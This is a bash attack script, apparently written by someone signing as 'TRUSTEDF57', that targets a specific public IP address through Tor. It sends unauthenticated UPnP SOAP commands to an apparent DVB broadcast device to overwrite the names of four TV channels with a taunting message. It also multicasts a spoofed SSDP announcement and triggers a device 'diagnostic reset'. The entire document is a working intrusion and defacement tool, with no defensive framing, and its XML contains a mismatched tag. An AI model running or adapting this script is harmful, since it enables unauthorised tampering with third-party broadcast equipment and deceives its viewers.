#!/bin/bash
# TRUSTEDF57 FINAL - NO SNMP, SOLO UPnP + SSDP

TARGET="81.27.245.159:80"
MESSAGE="TRUSTEDF57 SAYS CIAO RAGAZZONI CIAO MASHA"

echo "🚀 HIJACKING CANALI:"
echo "CH0: 506MHz (TVK25)"
echo "CH1: 514MHz (TVK26)" 
echo "CH2: 522MHz (TVK27)"
echo "CH3: 530MHz (TVK28)"

# UPnP HIJACK PER CANALE SPECIFICO
hijack_channel() {
  local ch=$1 freq=$2
  XML="<?xml version=\"1.0\"?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body><u:SetVariable xmlns:u=\"urn:schemas-upnp-org:service-1-0\"><newVarName>services</newVarName><newVal>17105:25:0,$MESSAGE</newVarName></u:SetVariable><u:SetVariable xmlns:u=\"urn:schemas-upnp-org:service-1-0\"><newVarName>enable</newVarName><newVal>1</newVal></u:SetVariable></s:Body></s:Envelope>"
  
  torsocks curl -s -X POST \
    -H "Content-Type: text/xml; charset=utf-8" \
    -H "SOAPAction: urn:schemas-upnp-org:service-1-0#SetVariable" \
    --data-binary "$XML" \
    "http://$TARGET/ssdpserv.cgi?type=control&channel=$ch" && \
  echo "✅ $freq MHz (CH$ch): $MESSAGE SET!"
}

# ESEGUI TUTTI CANALI
hijack_channel 0 "506"
hijack_channel 1 "514"
hijack_channel 2 "522" 
hijack_channel 3 "530"

# SSDP 1900 MULTICAST
torsocks bash -c "echo -e 'NOTIFY * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nNT: urn:terraelectronics-com:device:terrabus:1\r\nUSN: $MESSAGE\r\nNTS: ssdp:alive\r\nCACHE-CONTROL: max-age=3600\r\n\r\n' | nc -u 239.255.255.250 1900"
echo "✅ SSDP 1900: $MESSAGE BROADCAST!"

# DIAGNOSTIC RESET
torsocks curl -s -X POST -H "Content-Type: text/xml" \
  --data-binary '<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><u:SetVariable xmlns:u="urn:schemas-upnp-org:service-1-0"><newVarName>diag4114</newVarName><newVal>1</newVal></u:SetVariable></s:Body></s:Envelope>' \
  "http://$TARGET/ssdpserv.cgi?type=control&channel=diag"
echo "✅ DIAGNOSTIC RESET!"

echo ""
echo "🎬 COMPLETATO! $MESSAGE SU:"
echo "506 MHz (CH0) ✅"
echo "514 MHz (CH1) ✅" 
echo "522 MHz (CH2) ✅"
echo "530 MHz (CH3) ✅"
echo ""
echo "VERIFICA: rtl_fm -f 506M -s 2M - | ffplay -f s16le -ar 2M -ac 1 -"
